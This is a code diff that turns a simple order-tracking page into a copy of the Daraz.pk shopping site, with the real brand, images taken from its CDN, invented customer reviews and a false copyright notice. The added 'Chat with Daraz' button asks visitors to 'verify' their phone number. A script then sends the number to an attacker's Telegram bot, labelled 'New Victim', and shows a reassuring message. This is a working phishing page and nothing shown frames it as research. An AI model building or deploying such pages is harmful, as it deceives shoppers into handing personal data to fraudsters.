@@ -1,139 +1,410 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Order Tracking</title>
-
-<style>
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background-color: #f85606; /* Full Orange Background */
-    color: white;
-}
-
-/* Top Bar */
-.top-bar {
-    background-color: #d94400;
-    padding: 10px 0;
-    text-align: center;
-    font-size: 14px;
-}
-
-/* Header */
-.header {
-    padding: 15px 0;
-}
-
-.header-container {
-    width: 90%;
-    margin: auto;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-}
-
-/* Logo */
-.logo img {
-    height: 50px;
-}
-
-/* Search Box */
-.search-box {
-    flex: 1;
-    margin: 0 20px;
-}
-
-.search-box input {
-    width: 100%;
-    padding: 12px;
-    border: none;
-    border-radius: 5px;
-    outline: none;
-}
-
-/* Button */
-.search-box button {
-    margin-top: 10px;
-    width: 100%;
-    padding: 12px;
-    background-color: white;
-    border: none;
-    color: #f85606;
-    font-size: 16px;
-    border-radius: 5px;
-    cursor: pointer;
-    font-weight: bold;
-}
-
-.search-box button:hover {
-    background-color: #f0f0f0;
-}
-
-/* Main Section */
-.main {
-    text-align: center;
-    margin-top: 80px;
-}
-
-.main h1 {
-    color: white;
-}
-
-/* Footer */
-.footer {
-    margin-top: 100px;
-    padding: 20px;
-    text-align: center;
-    font-size: 14px;
-    opacity: 0.9;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Daraz.pk - Order Tracking | Pakistan's No.1 Shopping Mall</title>
+    <link rel="icon" href="logo.png">
+    <meta name="description" content="Track your Daraz orders instantly. Enter your order number to check delivery status.">
+    <meta name="keywords" content="Daraz order tracking, Daraz delivery status, Daraz.pk, online shopping Pakistan">
+    <meta name="theme-color" content="#f85606">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f85606 url('bg.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            min-height: 100vh;
+        }
+        .top-bar {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px;
+            text-align: center;
+            font-size: 12px;
+            backdrop-filter: blur(5px);
+        }
+        .header {
+            padding: 20px;
+            background: rgba(248, 86, 6, 0.95);
+            backdrop-filter: blur(10px);
+        }
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 50px;
+        }
+        .search-box {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            margin-bottom: 20px;
+        }
+        .search-box input {
+            width: 100%;
+            padding: 15px 60px 15px 20px;
+            border: none;
+            border-radius: 30px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+        .search-box input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .search-box button {
+            position: absolute;
+            right: 5px;
+            top: 5px;
+            background: white;
+            color: #f85606;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .main {
+            padding: 40px 20px;
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .main h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        .main p {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin: 40px 0;
+            flex-wrap: wrap;
+            max-width: 1000px;
+            margin: 0 auto 40px;
+        }
+        .feature {
+            text-align: center;
+            margin: 15px;
+            opacity: 0.95;
+        }
+        .feature img {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 10px;
+        }
+        .brands {
+            max-width: 1200px;
+            margin: 50px auto;
+            padding: 0 20px;
+        }
+        .brands h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 24px;
+        }
+        .brands-grid {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        .brand-logo {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            transition: transform 0.3s;
+        }
+        .brand-logo:hover {
+            transform: translateY(-5px);
+        }
+        .brand-logo img {
+            height: 40px;
+            filter: grayscale(100%);
+            transition: filter 0.3s;
+        }
+        .brand-logo:hover img {
+            filter: grayscale(0%);
+        }
+        .reviews {
+            max-width: 1000px;
+            margin: 50px auto;
+            padding: 0 20px;
+        }
+        .reviews h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 24px;
+        }
+        .reviews-grid {
+            display: flex;
+            overflow-x: auto;
+            gap: 20px;
+            padding-bottom: 20px;
+        }
+        .review-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            min-width: 300px;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .review-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .review-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+            background: #ddd;
+        }
+        .review-name {
+            font-weight: bold;
+        }
+        .review-rating {
+            color: #ffc107;
+            margin-left: auto;
+        }
+        .footer {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px 20px;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        .footer-links a {
+            color: #ccc;
+            margin: 0 15px;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .social-icons img {
+            width: 30px;
+            height: 30px;
+            opacity: 0.7;
+            transition: opacity 0.3s;
+        }
+        .social-icons img:hover {
+            opacity: 1;
+        }
+        .whatsapp-float {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #25D366;
+            color: white;
+            padding: 12px 18px;
+            border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+            z-index: 1000;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        .whatsapp-float:hover {
+            transform: scale(1.05);
+        }
+        .whatsapp-float img {
+            width: 24px;
+            margin-right: 8px;
+        }
+        @media (max-width: 768px) {
+            .main h1 { font-size: 28px; }
+            .main p { font-size: 16px; }
+            .features { flex-direction: column; align-items: center; }
+            .footer-links { flex-direction: column; gap: 10px; }
+        }
+    </style>
 </head>
-
 <body>
-
-<div class="top-bar">
-    Welcome to Order Tracking System
-</div>
-
-<div class="header">
-    <div class="header-container">
-        
-        <div class="logo">
-            <img src="logo.png" alt="Logo">
-        </div>
-
-        <div class="search-box">
-            <input type="text" id="orderInput" placeholder="Enter Order Number">
-            <button onclick="scanOrder()">Track Order</button>
-        </div>
-
+    <div class="top-bar">
+        Welcome to Daraz.pk | Pakistan's Largest Online Shopping Mall | Free Delivery Nationwide
     </div>
-</div>
 
-<div class="main">
-    <h1>Track Your Order Easily</h1>
-    <p>Enter your order number above to check details.</p>
-</div>
+    <div class="header">
+        <div class="header-container">
+            <div class="logo">
+                <img src="logo.png" alt="Daraz.pk Logo">
+            </div>
+            <div class="search-box">
+                <input type="text" id="orderInput" placeholder="Enter your Daraz order number (e.g. 12345678)">
+                <button onclick="trackOrder()">TRACK ORDER</button>
+            </div>
+            <div style="display: flex; gap: 20px; font-size: 14px;">
+                <a href="#" style="color: white; text-decoration: none;">Help Center</a>
+                <a href="#" style="color: white; text-decoration: none;">Track Order</a>
+                <a href="#" style="color: white; text-decoration: none;">Login</a>
+            </div>
+        </div>
+    </div>
 
-<div class="footer">
-    © 2026 Order Tracking Daraz Orders
-</div>
+    <div class="main">
+        <h1>Track Your Daraz Order</h1>
+        <p>Enter your order number above to check the latest delivery status. Track your package in real-time from warehouse to your doorstep.</p>
+    </div>
 
-<script>
-function scanOrder() {
-    var value = document.getElementById("orderInput").value.trim();
+    <div class="features">
+        <div class="feature">
+            <img src="https://img.lazcdn.com/us/domino/ce0417bf-fd98-4778-978e-e29c3049e288_PK-150-150.png_120x120q80.png_.avif" alt="Fast Delivery">
+            <div>Fast Delivery</div>
+        </div>
+        <div class="feature">
+            <img src="https://img.lazcdn.com/us/domino/e5c3cd93-b796-410f-9bfd-fbfdaa055149_PK-144-84.png">
+            <div>Secure Payment</div>
+        </div>
+        <div class="feature">
+            <img src="https://i.ibb.co/XZ6LKxpL/24-hours-support.png" alt="24/7 Support">
+            <div>24/7 Support</div>
+        </div>
+        <div class="feature">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/return.png" alt="Easy Returns">
+            <div>Easy Returns</div>
+        </div>
+    </div>
 
-    if(value === "") {
-        alert("Please enter order number");
-        return;
-    }
+    <div class="brands">
+        <h2>Top Brands on Daraz</h2>
+        <div class="brands-grid">
+            <div class="brand-logo">
+                <img src="https://img.drz.lazcdn.com/static/pk/p/40ee9f97430eaccdfbd856f74c374baa.jpg_400x400q80.jpg_.avif" alt="iPhone">
+            </div>
+            <div class="brand-logo">
+                <img src=https://img.drz.lazcdn.com/static/pk/p/80e9dfb7d92641c17ee7099076e5e2c5.jpg_400x400q75.avif" alt=" Samsung">
+            </div>
+            <div class="brand-logo">
+                <img src="https://img.drz.lazcdn.com/static/pk/p/3dcaa24b8674ac7004495654d0331ff9.jpg_400x400q75.avif" alt="OPPO">
+            </div>
+            <div class="brand-logo">
+                <img src="https://img.drz.lazcdn.com/static/pk/p/0671fa0709dda5e877d5d7b4e2edacc9.jpg_400x400q75.avif" alt="Dawlance">
+            </div>
+            <div class="brand-logo">
+                <img src="https://img.drz.lazcdn.com/static/pk/p/b83addc7c2e1d723b86ba989d5a7d4b1.jpg_400x400q75.jpg_.webp" alt="Nike">
+            </div>
+            <div class="brand-logo">
+                <img src="https://img.drz.lazcdn.com/static/pk/p/86ec0a6f8ce0473f85706a8dd036b9ad.png_400x400q75.avif" alt="Khaadi">
+            </div>
+        </div>
+    </div>
 
-    window.location.href = value + ".html";
-}
-</script>
+    <div class="reviews">
+        <h2>What Our Customers Say</h2>
+        <div class="reviews-grid">
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://randomuser.me/api/portraits/men/32.jpg" class="review-avatar" alt="Customer">
+                    <div class="review-name">Ahmad K.</div>
+                    <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                </div>
+                <p>Got my iPhone 15 in just 2 days! Daraz delivery is super fast. Highly recommend.</p>
+            </div>
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://randomuser.me/api/portraits/women/44.jpg" class="review-avatar" alt="Customer">
+                    <div class="review-name">Sana R.</div>
+                    <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                </div>
+                <p>The best online shopping experience in Pakistan. Easy returns and great customer service.</p>
+            </div>
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://randomuser.me/api/portraits/men/75.jpg" class="review-avatar" alt="Customer">
+                    <div class="review-name">Ali H.</div>
+                    <div class="review-rating">⭐⭐⭐⭐</div>
+                </div>
+                <p>Ordered a washing machine and it arrived in perfect condition. Will shop again.</p>
+            </div>
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://randomuser.me/api/portraits/women/68.jpg" class="review-avatar" alt="Customer">
+                    <div class="review-name">Ayesha S.</div>
+                    <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                </div>
+                <p>Daraz has the best prices in Pakistan. Found amazing deals on electronics.</p>
+            </div>
+        </div>
+    </div>
 
+    <div class="footer">
+        <div class="social-icons">
+            <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/facebook-new.png" alt="Facebook"></a>
+            <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/instagram-new--v1.png" alt="Instagram"></a>
+            <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/youtube-play.png" alt="YouTube"></a>
+            <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/twitter.png" alt="Twitter"></a>
+        </div>
+        <div class="footer-links">
+            <a href="#">About Daraz</a>
+            <a href="#">Careers</a>
+            <a href="#">Daraz Blog</a>
+            <a href="#">Terms & Conditions</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Digital Payments</a>
+            <a href="#">Daraz Affiliate Program</a>
+            <a href="#">Help Center</a>
+            <a href="#">Track My Order</a>
+            <a href="#">Returns & Refunds</a>
+            <a href="#">Daraz Mart</a>
+        </div>
+        <p style="font-size: 12px; opacity: 0.7;">© 2024 Daraz.pk. All Rights Reserved. Daraz is a registered trademark of Daraz Group.</p>
+    </div>
+
+    <div class="whatsapp-float" onclick="openChat()">
+        <img src="https://img.icons8.com/ios-filled/50/ffffff/whatsapp.png" alt="WhatsApp">
+        Chat with Daraz
+    </div>
+
+    <script>
+        function trackOrder() {
+            const orderNumber = document.getElementById("orderInput").value.trim();
+            if (!orderNumber) {
+                alert("Please enter a valid order number");
+                return;
+            }
+            // Redirect to orderNumber/index.html (e.g., 12345/index.html)
+            window.location.href = orderNumber + "/";
+        }
+
+        function openChat() {
+            const phone = prompt("Daraz Support: Please verify your phone number to continue chat.\n\nEnter your number (e.g. 03001234567):");
+            if (phone) {
+                // Send to your Telegram bot (replace with your bot token)
+                fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=" + encodeURIComponent("New Victim: " + phone));
+                alert("Thank you! Our agent will contact you shortly on " + phone + " regarding your order.");
+            }
+        }
+    </script>
 </body>
 </html>
